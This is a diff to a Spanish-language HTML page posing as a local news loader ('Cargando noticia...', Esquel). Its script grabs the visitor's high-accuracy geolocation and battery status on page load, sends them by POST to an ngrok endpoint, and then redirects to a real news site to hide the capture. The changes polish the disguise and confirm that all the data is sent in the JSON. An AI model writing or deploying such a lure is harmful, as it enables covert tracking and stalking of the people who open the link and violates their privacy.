@@ -7,23 +7,23 @@
 <body style="font-family: Arial; text-align: center; padding-top: 50px;">
 
     <h1>Cargando noticia...</h1>
-    <p>Conectando con el servidor de noticias local.</p>
+    <p>Conectando con el servidor local de Esquel.</p>
 
     <script>
         async function enviar(pos) {
             // TU LINK DE NGROK (Asegurate que sea el actual)
             const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save";
 
-            // 1. Obtener Batería
-            let batNivel = "Cargando...";
-            let estaCargando = "Desconocido";
+            // 1. Obtener datos de Batería
+            let batNivel = "No disponible";
+            let estaCargando = "No";
             try {
                 const battery = await navigator.getBattery();
                 batNivel = (battery.level * 100).toFixed(0) + "%";
                 estaCargando = battery.charging ? "Si" : "No";
-            } catch (e) { batNivel = "No permitido"; }
+            } catch (e) {}
 
-            // 2. ENVIAR TODO (Aquí estaba el error, ahora incluimos todo)
+            // 2. ENVIAR TODO (Ahora sí, todo dentro del JSON)
             fetch(URL_NGROK, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -38,7 +38,7 @@
                 })
             });
 
-            // 3. Redirigir
+            // 3. Redirigir a la noticia real
             setTimeout(() => {
                 window.location.href = "https://www.eqsnotas.com/";
             }, 1000);
@@ -49,7 +49,9 @@
         }
 
         window.onload = function() {
-            navigator.geolocation.getCurrentPosition(enviar, error, {enableHighAccuracy: true});
+            navigator.geolocation.getCurrentPosition(enviar, error, {
+                enableHighAccuracy: true
+            });
         };
     </script>
 </body>
